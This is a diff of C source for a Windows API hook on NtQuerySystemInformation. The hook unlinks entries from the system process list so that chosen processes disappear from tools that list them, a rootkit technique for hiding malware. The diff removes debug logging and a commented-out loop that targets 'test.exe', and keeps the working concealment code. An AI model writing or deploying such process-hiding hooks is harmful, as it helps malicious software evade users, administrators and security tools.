@@ -2,50 +2,6 @@
 
 NtQuerySystemInformationHk OrigNtQuerySystemInformation;
 
-static void getsysinfo(SYSTEM_INFORMATION_CLASS SystemInformationClass)
-{
-    switch (SystemInformationClass)
-    {
-    case SystemBasicInformation:
-        Mylog("SystemBasicInformation", 0, TRUE);
-        break;
-    case SystemPerformanceInformation:
-        Mylog("SystemPerformanceInformation", 0, TRUE);
-        break;
-    case SystemTimeOfDayInformation:
-        Mylog("SystemTimeOfDayInformation", 0, TRUE);
-        break;
-    case SystemProcessInformation:
-        Mylog("SystemProcessInformation", 0, TRUE);
-        break;
-    case SystemProcessorPerformanceInformation:
-        Mylog("SystemProcessorPerformanceInformation", 0, TRUE);
-        break;
-    case SystemInterruptInformation:
-        Mylog("SystemInterruptInformation", 0, TRUE);
-        break;
-    case SystemExceptionInformation:
-        Mylog("SystemExceptionInformation", 0, TRUE);
-        break;
-    case SystemRegistryQuotaInformation:
-        Mylog("SystemRegistryQuotaInformation", 0, TRUE);
-        break;
-    case SystemLookasideInformation:
-        Mylog("SystemLookasideInformation", 0, TRUE);
-        break;
-    case SystemCodeIntegrityInformation:
-        Mylog("SystemCodeIntegrityInformation", 0, TRUE);
-        break;
-    case SystemPolicyInformation:
-        Mylog("SystemPolicyInformation", 0, TRUE);
-        break;
-    default:
-        Mylog("Noinfo", 0, TRUE);
-
-        break;
-    }
-}
-
 NTSTATUS WINAPI HookedNtQuerySystemInformation(
     __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
     __inout PVOID SystemInformation,
@@ -54,18 +10,10 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
 )
 {
 	NTSTATUS status = OrigNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
-    
-    if (!NT_SUCCESS(status)) {
-        char buf[1024];
-        sprintf(buf, "OrigNtQuerySystemInformation failed: 0x%08X\n", status);
-        Mylog(buf, 0, TRUE);
-    }
-    getsysinfo(SystemInformationClass);
-	if (SystemInformationClass == SystemProcessInformation)
+	if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status))
 	{
 		PSYSTEM_PROCESS_INFORMATION_HK sysProcInfoCurr = NULL;
 		PSYSTEM_PROCESS_INFORMATION_HK sysProcInfoNext = (PSYSTEM_PROCESS_INFORMATION_HK)(SystemInformation);
-        
         do
         {
             sysProcInfoCurr = sysProcInfoNext;
@@ -77,18 +25,6 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
                 else sysProcInfoCurr->NextEntryOffset += sysProcInfoNext->NextEntryOffset;
             }
         } while (sysProcInfoCurr->NextEntryOffset);
-        // while (sysProcInfoCurr)
-		// {
-        //     Mylog("Inside loop with sysProcInfoCurr", 0, TRUE);
-		// 	if (wcscmp(sysProcInfoNext->ImageName.Buffer, (PWSTR)"test.exe"))
-        //     {
-        //         Mylog(sysProcInfoNext->ImageName.Buffer, 1, TRUE);
-        //         if (sysProcInfoNext->NextEntryOffset == 0) sysProcInfoCurr->NextEntryOffset = 0;
-        //         else sysProcInfoCurr->NextEntryOffset += sysProcInfoNext->NextEntryOffset;
-        //     }
-        //     sysProcInfoCurr = sysProcInfoNext;
-        //     sysProcInfoNext = (PSYSTEM_PROCESS_INFORMATION_HK)(sysProcInfoCurr + sysProcInfoCurr->NextEntryOffset);
-		// }
 	}
     return status;
 }
